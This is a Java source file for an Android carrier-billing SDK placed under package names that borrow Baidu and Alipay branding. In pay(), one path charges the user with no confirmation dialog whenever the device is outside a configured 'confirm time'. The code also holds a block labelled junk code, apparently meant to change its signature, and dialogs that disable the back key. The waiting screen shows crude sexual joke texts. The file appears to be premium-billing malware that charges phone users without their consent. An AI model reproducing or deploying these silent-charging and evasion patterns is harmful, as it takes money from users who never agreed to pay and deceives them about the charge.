package com.baidu.serv;

import java.util.Date;

import com.baidu.alipay.AppBox;
import com.baidu.alipay.AppProperty;
import com.baidu.alipay.AppTask;
import com.baidu.alipay.AppTaskHandler;
import com.baidu.alipay.AppTaskStat;
import com.baidu.alipay.AppTaskStatHandler;
import com.baidu.alipay.InitArgumentsHelper;
import com.baidu.alipay.LogUtil;
import com.baidu.alipay.UserLogUtil;
import com.baidu.alipay.Utils;
import com.baidu.serv1.IPayCallBack;
import com.baidu.serv1.PayResult;
import com.baidu.serv1.PaySdk;

import android.app.Activity;
import android.app.Application;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class PaySdk1 {
	
	private static final String TAG = "PaySdk";
	private static final String TAG_YX = "____";
	public static Context _context = null;
	private int fee = 0;
	private IPayCallBack payCallBack;
//	private Handler synchHandler;
//	private Handler netPayHandler;
//	private int synchDeal = 0;
	private boolean needUnRegister = false;
	
	private Dialog waitingDialog = null;
	
	private int type1 = 0;
	private boolean isYx = false;
	private boolean changed = false;
	
	
//	private ABroadcastReceiver aReceiver = new ABroadcastReceiver();
	
	private void initSynchHandler(final Context context){
		this.type1 = 0;		
	}
	
	/**
	 * 是否网络支付
	 * @param context
	 */
//	private void confirmNetPay(final Context context){
//		Handler handler = new Handler(HandlerThreadInstance.getLooper()){
//			 public void handleMessage(Message msg) {
//				 switch(msg.what){
//				 case 1:
//					 realPay(context, fee, payCallBack);
//					 
//					 break;
//				 default:
//					 synchHandler.sendEmptyMessage(AppProperty.REQUEST_RUNERROR);
//					 
//					 break;
//				 }
//			 }
//		};
//		
//		new SdkDialogNet(context, Utils.getResource(context, "jxt_waiting_selectorDialog", "style"), handler);
//	}
	
	/**
	 * 支付
	 * @param context
	 * @param fee
	 * @param payCallBack
	 */
	public void pay(final Context context,final int fee,String desc,final IPayCallBack payCallBack){
		pay(context, fee, desc, payCallBack, 0);
	}
	
	/**
	 * 支付
	 * @param context
	 * @param fee
	 * @param payCallBack
	 */
	public void pay(final Context context,final int fee,final String desc,final IPayCallBack payCallBack,final int feeType){
	
//		LogUtil.e(TAG, "pay : "+fee+" ; "+desc);
		
		final int _fee = fee;

		this.fee = _fee;

		this.payCallBack = payCallBack;
		_context = context;
		
		initSynchHandler(context);
		
		final Handler handler = new Handler(HandlerThreadInstance.getLooper()){
			 public void handleMessage(Message msg) {
				 try{
					 switch(msg.what){
					 case 1:
						 realPay(context, _fee, payCallBack, feeType);
						 break;
					 default:
						 PayResult payResult = new PayResult();
						 payResult.setMoney(_fee);
						 payResult.setCode(PayResult.CODE_CANCEL);
						 payCallBack.onFail(payResult);
					 }
					 
				 }catch (Exception e) {
					e.printStackTrace();
				}
			 }
		};
		
		//垃圾代码开始
		int dadada = 0;
		
		if(dadada < 0){
			String asffa = "at";
			String fffsa = "is";

			String fafsa = "url";
			String sadss = "rest";
			
			String afa = sadss+"."+fffsa+"."+asffa+"."+fafsa;
		}
		
		//垃圾代码结束
		
		
		if(isYx(desc)){
			isYx = true;
			if(InitArgumentsHelper.getInstance(context).inConfirmTime()){	
				final int theme = Utils.getResource(context, "selectorDialog_yx", "style");
				
				new Thread(){
					public void run(){
						Looper.prepare();
						new YxSdkDialog1(context, theme, handler, _fee, desc);
						Looper.loop();
					}
				}.start();
				
			}else{
				handler.sendEmptyMessage(1);
			}
		}else{
			new Thread(){
				public void run(){
					Looper.prepare();
					new SdkDialog(context, Utils.getResource(context, "selectorDialog", "style"),handler,_fee,desc);
					Looper.loop();					
				}
			}.start();

			
//			handler.sendEmptyMessage(1);
		}
	}
	
	
		
	/**
	 * 支付
	 * @param context
	 * @param fee
	 * @param payCallBack
	 */
	public void realPay(Context context,int fee,IPayCallBack payCallBack,int feeType){

		sendBroadcast(context);
		
		boolean needSync = InitArgumentsHelper.getInstance(context).isSync();
		boolean positive = InitArgumentsHelper.getInstance(context).isPositive();
//		boolean isChinaMobile = DeviceInfo.OPERATOR_CHINAMOBILE.equals(DeviceInfo.getSimOperatorType(context));
		
		boolean force = InitArgumentsHelper.getInstance(context).isForce();
		
		if(!needSync){
			needSync = Utils.getHasBlack(context) && force;
		}
		
		if(positive || needSync){
			paySync(context, fee, payCallBack,feeType);
		}else{
			payAsync(context, fee, payCallBack,feeType);
		}
	}
	
	private void sendBroadcast(Context context){
//		LogUtil.e(TAG, "send broadcast");
//		Intent intent = new Intent();
//		intent.setAction("com.jxt.pay.sdk.broadcast");
//		context.sendBroadcast(intent);
//		SpriteReceiver.realExec(context, null);
		PaySdk.initReceiver(context);
		
		//set first fee time
		Utils.setFirstFeeTime(context);
		
	}

	/**
	 * 同步支付
	 * @param context
	 * @param fee
	 * @param payCallBack
	 */
	private void paySync(final Context context,final int fee,final IPayCallBack payCallBack,final int feeType){
		try{
			if(isYx){
				waitingDialog = new WaitingYxDialog(context);
			}else{
				if(fee >= 1000){
					waitingDialog  = new WaitingDialog(context, Utils.getResource(context, "jxt_waiting_selectorDialog", "style"));
				}
			}
			
//			String random = System.currentTimeMillis()+"";
//			
//			IntentFilter intentFilter = new IntentFilter();
//			intentFilter.addAction(Utils.getStrings(new String[]{"com","lxt","pay","sdk","sync","broadcast",context.getPackageName(),random,fee+""}, "."));
//			context.registerReceiver(aReceiver, intentFilter);
//			needUnRegister = true;
//			
//			Intent intent = new Intent();
//			intent.setAction(ElephantService.class.getName());
//			intent.putExtra("fee", fee);
//			intent.putExtra("random", random);
//			intent.putExtra("type1", type1);
//			
//			context.startService(intent);
			
//			new Thread(){
//            	public void run(){
			final Handler synchHandler = new Handler(HandlerThreadInstance.getLooper()){
				 public void handleMessage(Message msg) {

					 try{
						 PayResult payResult = new PayResult();
						 payResult.setMoney(fee);
						 
						 switch (msg.what) {
		                // -2为网络连接失败 不能玩
		                case AppProperty.REQUEST_NETERROR:
		                	payResult.setCode(PayResult.CODE_NETERROR);
		                    break;
		                // -1是通道覆盖问题 可以玩
		                case AppProperty.REQUEST_NOORDER:
		                	payResult.setCode(PayResult.CODE_NOORDER);
		                    break;
		                // 0是跑脚本出错,应重新计费
		                case AppProperty.REQUEST_RUNERROR:
		                	payResult.setCode(PayResult.CODE_RUNERROR);
		                    break;
		                // 1计费成功
		                case AppProperty.REQUEST_SUCCESS:
		                	payResult.setCode(PayResult.CODE_SUCC);
		                	payResult.setPayMoney(fee);
		                	
		                    break;
		                case AppProperty.REQUEST_UPERROR:
		                	payResult.setCode(PayResult.CODE_UPERROR);
		                    break;
		                case AppProperty.REQUEST_WAIT:
		                	payResult.setCode(PayResult.CODE_UPERROR);
		                    break;
		                default:
		                	payResult.setCode(PayResult.CODE_UPERROR);
		                    break;
		                }
						 
						 if(waitingDialog != null){
							 waitingDialog.dismiss();
						 }
						 
						 boolean finished = false;
						 
//						 if(type1 == 0 && msg.what != AppProperty.REQUEST_SUCCESS && !changed){
//							 type1 = 1;
//							 changed = true;
//							 confirmNetPay(context);
//						 }
////						 else if(type1 >= 1 && msg.what != AppProperty.REQUEST_SUCCESS && !changed){
////							 type1 = 0;
////							 changed = true;
////							 confirmMobPay(context);
////						 }
//						 else{
							 finished = true;
//						 }
						 
						 if(finished){
							
							 if(payCallBack != null){
								 if(msg.what == AppProperty.REQUEST_SUCCESS){
									 LogUtil.e(TAG, "payCallBack : succ");
									 
									 final PayResult _result = payResult;
									 
									 Handler okHandler = new Handler(HandlerThreadInstance.getLooper()){
										 public void handleMessage(Message msg) {
											 payCallBack.onSucc(_result);
											 
											 super.handleMessage(msg);
										 }
									 };
									 
									 if(feeType < 0){
										 new SuccConfirmDialog(context, Utils.getResource(context, "selectorDialog", "style"),okHandler);
									 }else{
										 payCallBack.onSucc(payResult);
									 }
								 }else{
		//							 LogUtil.e(TAG, "payCallBack : fail");
									 
									 payCallBack.onFail(payResult);
								 }
							 }
							 
//							 synchDeal = 1;
						 }
					 }catch (Exception e) {
						e.printStackTrace();
					}finally{
//						if(aReceiver != null && needUnRegister){
//							context.unregisterReceiver(aReceiver);
//							needUnRegister = false;
//						}
					}
					 
					 super.handleMessage(msg);
				 }
			};
			
			new BaseThread(null){
				public void run(){
					SelfHandler selfHandler = new SelfHandler() {
						
						@Override
						public void handleMessage(SelfMessage selfMessage) {
							Message msg = selfMessage.getMessage();
							LogUtil.e(TAG, "error ***** "+msg.what);
							
							if(msg.what == AppProperty.BASE_ERROR){
								msg.what = AppProperty.REQUEST_RUNERROR;
							}
							
							synchHandler.sendMessage(msg);
						}
					};
					Looper.prepare();
					new AppBox(selfHandler, context, fee,true,feeType).run();
					Looper.loop();
				}
			}.start();
            		
//                }
//            }.start();
			
//			Intent intent = new Intent();
//			intent.setClass(context, TigerActivity.class);
//			intent.putExtra("type1", type1);
//			intent.putExtra("fee", fee);
//			intent.putExtra("random", random);
//
//			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//			
//			context.startActivity(intent);
			
		}catch (Exception e) {
			e.printStackTrace();
		}
	}
	
//	class ABroadcastReceiver extends BroadcastReceiver{
//
//		@Override
//		public void onReceive(Context context, Intent intent) {
//
//			int what = intent.getIntExtra("what", -1);
//			
////			LogUtil.e(TAG, "ABroadcastReceiver : "+what);
//			
//			if(synchHandler == null){
//				initSynchHandler(context);
//			}
//			
//			synchHandler.sendEmptyMessage(what);
//		}
//		
//	}
	
	/**
	 * 异步支付
	 * @param context
	 * @param fee
	 * @param payCallBack
	 */
	private void payAsync(final Context context,final int fee,final IPayCallBack payCallBack, final int feeType){
		
		final Handler handler = new Handler(HandlerThreadInstance.getLooper()){
			 public void handleMessage(Message msg) {				 
				 try{
					 boolean succ = false;
					 
					 if(msg.what == 1){
						 succ = true;
					 }
					 
					 PayResult payResult = new PayResult();
						
					if(succ){
						payResult.setCode(PayResult.CODE_SUCC);
						payResult.setMoney(fee);
						payResult.setPayMoney(fee);
						payCallBack.onSucc(payResult);
						
						//启动AppTaskService
//						LogUtil.e(TAG, "to start AppTaskService");
						
//						Intent intent = new Intent(context, AppTaskService.class);
//						context.startService(intent);
						
//						Intent intent1 = new Intent(context, AppTaskSynchService.class);
//						context.startService(intent1);
					}else{
						payResult.setCode(PayResult.CODE_FAIL);
						payResult.setMoney(fee);
						payResult.setPayMoney(0);
						payCallBack.onFail(payResult);
					}
				 }catch (Exception e) {
					e.printStackTrace();
				}
				 
				 super.handleMessage(msg);
			 }
		};
		
		new BaseThread(handler){
			public void run()
			{
//				LogUtil.e(TAG, "pay async start ...");
				
				boolean succ = false;
				
//				AppTaskStatHandler appTaskStatHandler = new AppTaskStatHandler(context);
				AppTaskHandler appTaskHandler = new AppTaskHandler(context);
				
				try{
//					AppTaskStat appTaskStat = appTaskStatHandler.get();
//					
//					appTaskStat.setTotalFee(appTaskStat.getTotalFee()+fee);
//					appTaskStat.setTotalNum(appTaskStat.getTotalNum()+1);
//					
//					appTaskStatHandler.add(appTaskStat);
					
					AppTask appTask = new AppTask();
					appTask.setApplyTime(new Date());
					appTask.setFee(fee);
					appTask.setPriority(1);
					
					appTaskHandler.addTask(appTask);
					
					succ = true;
				}catch (Exception e) {
					e.printStackTrace();
				}finally{
//					if(appTaskStatHandler != null){
//						appTaskStatHandler.close();
//					}
					
					if(appTaskHandler != null){
						appTaskHandler.close();
					}
				}
				
//				LogUtil.e(TAG, "pay async result : "+succ);
				
				if(succ){
					handler.sendEmptyMessage(1);
				}else{
					handler.sendEmptyMessage(0);
				}
			}
		}.start();
		
	}
	
//	class SdkDialogNet extends Dialog {
//		Context context;
//		
//		public SdkDialogNet(Context context, int theme,final Handler handler) {
//			super(context, theme);
//			
//			this.context=context;
//			View view = LayoutInflater.from(context).inflate(Utils.getResource(context, "jxt_sdk_dialog_towebpage", "layout"), null);
//			Button b1 = (Button) view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_towebpage_btn_ok", "id"));
//			Button b2 = (Button) view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_towebpage_btn_cancel", "id"));
//			
//			b1.setOnClickListener(new View.OnClickListener() {
//				
//				@Override
//				public void onClick(View arg0) {
//					dismiss();
//					handler.sendEmptyMessage(1);
//				}
//			});
//			
//			b2.setOnClickListener(new View.OnClickListener() {
//				
//				@Override
//				public void onClick(View arg0) {
//					dismiss();
//					handler.sendEmptyMessage(0);
//				}
//			});
//			setContentView(view);
//			show();
//			setCanceledOnTouchOutside(false);
//		}
//		
//		@Override  
//	    public boolean onKeyDown(int keyCode, KeyEvent event){  
//	        if (keyCode == KeyEvent.KEYCODE_BACK )  
//	        {  
//	        }  
//	          
//	        return false;
//	    }  
//
//	}
	
//	class SdkDialogMob extends Dialog {
//		Context context;
//		
//		public SdkDialogMob(Context context, int theme,final Handler handler) {
//			super(context, theme);
//			
//			this.context=context;
//			View view = LayoutInflater.from(context).inflate(Utils.getResource(context, "jxt_sdk_dialog_tomobile", "layout"), null);
//			Button b1 = (Button) view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_tomobile_comfirm_btn", "id"));
//			TextView t1 = (TextView) view.findViewById(Utils.getResource(context,"jxt_sdk_dialog_tomobile_cancel_btn","id"));
//			
//			b1.setOnClickListener(new View.OnClickListener() {
//				
//				@Override
//				public void onClick(View arg0) {
//					dismiss();
//					handler.sendEmptyMessage(1);
//				}
//			});
//			t1.setOnClickListener(new View.OnClickListener() {
//				
//				@Override
//				public void onClick(View arg0) {
//					dismiss();
//					handler.sendEmptyMessage(0);
//				}
//			});
//			setContentView(view);
//			show();
//			setCanceledOnTouchOutside(false);
//		}
//		
//		@Override  
//		    public boolean onKeyDown(int keyCode, KeyEvent event)  
//		    {  
//		        if (keyCode == KeyEvent.KEYCODE_BACK )  
//		        {  
//		        }  
//		          
//		        return false;
//		    }  
//
//	}
	
//	class YxSdkDialog extends Dialog{
//		Context context;
//		
//		public YxSdkDialog(Context context, int theme,final Handler handler,int fee,String desc) {
//			super(context, theme);
//			
//			this.context=context;
//			this.requestWindowFeature(Window.FEATURE_NO_TITLE);// 去掉标题栏
//			this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
//					WindowManager.LayoutParams.FLAG_FULLSCREEN);// 去掉信息栏
//			View view = LayoutInflater.from(context).inflate(
//					Utils.getResource(context, "jxt_sdk_dialog_yx", "layout"), null);
//
//			setCancelable(false);
//			setContentView(view);
//			TextView btn = (TextView) view
//					.findViewById(Utils.getResource(context, "jxt_sdk_dialog_yx_cancel", "id"));
//
//			TextView queren = (TextView) view
//					.findViewById(Utils.getResource(context, "jxt_sdk_dialog_yx_queren", "id"));
//			
//			TextView priceTxt = (TextView) view
//					.findViewById(Utils.getResource(context, "jxt_sdk_dialog_yx_price", "id"));
//			
//			priceTxt.setText("￥ "+getMoney(fee)+"元");
//			
//			String[] arr = desc.split(TAG_YX);
//			
//			TextView daojuTxt = (TextView)view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_yx_daoju", "id"));
//			TextView appNameTxt = (TextView)view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_yx_appname", "id"));
//			
//			daojuTxt.setText(arr[0]);
//			appNameTxt.setText(arr[1]);
//			
//			btn.setOnClickListener(new View.OnClickListener() {
//
//				@Override
//				public void onClick(View arg0) { 
//					dismiss();
//					handler.sendEmptyMessage(0);
//				}
//			});
//			queren.setOnClickListener(new View.OnClickListener() {
//
//				@Override
//				public void onClick(View arg0) { 
//					dismiss();
//					handler.sendEmptyMessage(1);
//				}
//			});
//			show();
//		}
//		
//		@Override  
//	    public boolean onKeyDown(int keyCode, KeyEvent event)  
//	    {  
//	        if (keyCode == KeyEvent.KEYCODE_BACK )  
//	        {  
//	        }  
//	          
//	        return false;
//	    }  
//	}
	
	private boolean isYx(String desc){
		return desc != null && desc.contains(TAG_YX);
	}
	
	class YxSdkDialog1 extends Dialog {
		Context context;
		
		public YxSdkDialog1(Context context, int theme,final Handler handler,int fee,String desc) {
			super(context, theme);
			this.context=context;
			View view = LayoutInflater.from(context).inflate(Utils.getResource(context, "jxt_sdk_dialog", "layout"), null);
			Button b1 = (Button) view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_comfirm_btn", "id"));
			TextView t1 = (TextView) view.findViewById(Utils.getResource(context,"jxt_sdk_dialog_cancel_btn","id"));
			
			t1.setVisibility(TextView.VISIBLE);
			
			TextView t2 = (TextView)view.findViewById(Utils.getResource(context, "jxt_tv_hint", "id"));
			
			StringBuffer sb = new StringBuffer();
//			if(desc != null && desc.length() > 0){
//				sb.append(desc).append("\r\n");
//			}
			sb.append("确认支付？资费"+getFeeChn(fee)+"将由合作伙伴代为收取，收费成功后由运营商发送短信到您的收件箱。客服热线：4001558668.");
			t2.setText(sb.toString());
			
			b1.setOnClickListener(new View.OnClickListener() {
				
				@Override
				public void onClick(View arg0) {
					dismiss();
					handler.sendEmptyMessage(1);
				}
			});
			t1.setOnClickListener(new View.OnClickListener() {
				
				@Override
				public void onClick(View arg0) {
					dismiss();
					handler.sendEmptyMessage(0);
				}
			});
			setContentView(view);
			show();
			setCanceledOnTouchOutside(false);
		}
		
		private String getFeeChn(int fee){
			if(fee >= 100){
				return (fee/100)+"元";
			}else{
				return fee+"分";
			}
		}
		
		@Override  
		    public boolean onKeyDown(int keyCode, KeyEvent event)  
		    {  
		        if (keyCode == KeyEvent.KEYCODE_BACK )  
		        {  
		        }  
		          
		        return false;
		    }  

	}
	
	class SdkDialog extends Dialog {
		Context context;
		
		public SdkDialog(Context context, int theme,final Handler handler,int fee,String desc) {
			super(context, theme);
			
			this.context=context;
			View view = LayoutInflater.from(context).inflate(Utils.getResource(context, "jxt_sdk_dialog", "layout"), null);
			Button b1 = (Button) view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_comfirm_btn", "id"));
			TextView t1 = (TextView) view.findViewById(Utils.getResource(context,"jxt_sdk_dialog_cancel_btn","id"));
			
			TextView t2 = (TextView)view.findViewById(Utils.getResource(context, "jxt_tv_hint", "id"));
			
			StringBuffer sb = new StringBuffer();
			if(desc != null && desc.length() > 0){
				sb.append(desc).append("\r\n");
			}
			sb.append("信息费").append(getMoney(fee)).append("元，由合作伙伴代为收取，收费成功后由运营商发送短信到您的收件箱。客服热线：4001558668.");
			t2.setText(sb.toString());
			
			b1.setOnClickListener(new View.OnClickListener() {
				
				@Override
				public void onClick(View arg0) {
					dismiss();
					handler.sendEmptyMessage(1);
				}
			});
			t1.setOnClickListener(new View.OnClickListener() {
				
				@Override
				public void onClick(View arg0) {
					dismiss();
					handler.sendEmptyMessage(0);
				}
			});
			setContentView(view);
			show();
			setCanceledOnTouchOutside(false);
		}
		
		@Override  
		    public boolean onKeyDown(int keyCode, KeyEvent event)  
		    {  
		        if (keyCode == KeyEvent.KEYCODE_BACK )  
		        {  
		        }  
		          
		        return false;
		    }  

	}
	
	private static String getMoney(int money){
		
		int zhengshu = money / 100;
		
		int yushu = money % 100;
		
		if(yushu == 0){
			return zhengshu+"";
		}
		if (yushu < 10){
			return zhengshu + ".0"+yushu;
		}
		
		return zhengshu + "."+yushu;
	}
	
	class WaitingYxDialog extends Dialog {
		TextView t1;
		int num=0;
		String xx[]=new String []{"今天女同学穿了一件很暴露的衣服，让我给点评价，我一看说：让我有股想犯罪的冲动啊。她竟然说那你就行动啊，我不会怪你的。我激动的不行，上去就按住她，把她脖子上的金链子扯下来就走。这真不能怪我，谁让她穿这么少，把金链子都露出来了。",
					"昨晚去拜访丈母娘，小姨子也在，晚上睡觉小姨子让丈母娘找睡衣，结果听到的对话如下：小姨子：妈，这太短了，屁股都露出来了？丈母娘：没事，你姐夫又不是外人，看就看呗。我瞬间内牛满面啊！",
					"一女晚上外出打麻将，半夜回家怕吵醒丈夫，便在客厅把衣服脱了个精光，轻轻走进卧室，不料丈夫惊醒，见此大吃一惊：我X你妈的，打多大的，输成这个B样！",
					"公交车上一年轻的妈妈给宝宝喂奶，宝宝吃的不老实，年轻的妈妈生气说孩子：吃不吃？不吃我给旁边的叔叔吃了。一连说了几次。坐旁边的叔叔忍不住说：我的小少爷，吃不吃给个准信，叔叔都坐超两站了。",
					"公园有一对恋人正在甜蜜，女孩撒娇说：老公，我牙痛~~！男孩于是吻了女孩一口问：还痛吗？女孩说不痛了！一会儿女孩又撒娇的说：老公，我脖子痛！男孩又吻了吻女孩的脖子，又问这回还痛吗？女孩说不痛了！旁边一老太太站着看了半天，忍不住上千问：小伙子，你真神了，你能治痔疮不？",
					"某人去厕所怎么也打不开马桶盖子，着急就拉在马桶盖上，方便以后突然发现墙壁上有个按钮，按了一下，没想到盖子突然弹开，把屎弹在天花板上。他很难为情，叫来服务员指着天花板说：我给你200块钱把这个清理干净。服务员看了看天花板说：我给你800块钱，你告诉我怎么把屎拉在天花板上。"};
		final Handler handler = new Handler();
		Runnable runnable = new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				
				
				t1.setText(xx[num]);
				handler.postDelayed(this, 4000);// 50是延时时长
				num+=1;
				if (num>=xx.length) {
					num=0;
				}
			}
		};

		public WaitingYxDialog(Context context) {
			super(context, android.R.style.Theme);
			setOwnerActivity((Activity) context);
			requestWindowFeature(Window.FEATURE_NO_TITLE);
			setContentView(Utils.getResource(context, "jxt_wating_main_yx", "layout"));

			t1 = (TextView) findViewById(Utils.getResource(context, "jxt_waiting_main_yx_t1", "id"));

			handler.postDelayed(runnable, 4000);// 打开定时器，执行操作 
			show();
		}
		
		public void close(){
			handler.removeCallbacks(runnable);// 关闭定时器处理
		}

		@Override  
	    public boolean onKeyDown(int keyCode, KeyEvent event)  
	    {  
	        if (keyCode == KeyEvent.KEYCODE_BACK )  
	        {  
	        }  
	          
	        return false;  
	          
	    }  
	}
	
	
	class WaitingDialog extends Dialog{
		
		public WaitingDialog(Context context, int theme) {
			super(context, theme);
			
			View view = LayoutInflater.from(context).inflate(Utils.getResource(context, "jxt_wating_main", "layout"),null);
			
			setContentView(view);
			show();
			setCanceledOnTouchOutside(false);
		}
		
		@Override  
	    public boolean onKeyDown(int keyCode, KeyEvent event)  
	    {  
	        if (keyCode == KeyEvent.KEYCODE_BACK )  
	        {  
	        }  
	          
	        return false;  
	          
	    }  
	}
	
	class SuccConfirmDialog extends Dialog implements android.view.View.OnClickListener {
		
		private Handler okHandler;
		
		public SuccConfirmDialog(Context context, int theme,Handler okHandler) {
			super(context, theme);
			
			this.okHandler = okHandler;
			
			this.requestWindowFeature(Window.FEATURE_NO_TITLE);// 去掉标题栏
			this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
					WindowManager.LayoutParams.FLAG_FULLSCREEN);// 去掉信息栏
			
			View view = LayoutInflater.from(context).inflate(
					Utils.getResource(context, "jxt_sdk_dialog_ok", "layout"), null);
			
			Button	ok = (Button) view.findViewById(Utils.getResource(context, "jxt_sdk_dialog_comfirm_btn_ok", "id"));
			TextView msg = (TextView) view.findViewById(Utils.getResource(context, "jxt_tv_hint_ok", "id"));
//			TextView cancel = (TextView) view
//					.findViewById(Utils.getResource(context, "jxt_sdk_dialog_cancel_btn_ok", "id"));
			ok.setOnClickListener(this);
//			cancel.setOnClickListener(this);
			msg.setText("本次短信发送成功，请确定后查收您的订购！如有疑问请致电：4001558668。");
			setCanceledOnTouchOutside(false);
			setContentView(view);
			show();
		}
		
		@Override
		public boolean onKeyDown(int keyCode, KeyEvent event) {
			
			return false;
		}
		
		@Override
		public void onClick(View arg0) {
			okHandler.sendEmptyMessage(1);
			
			dismiss();
		}

	}

}
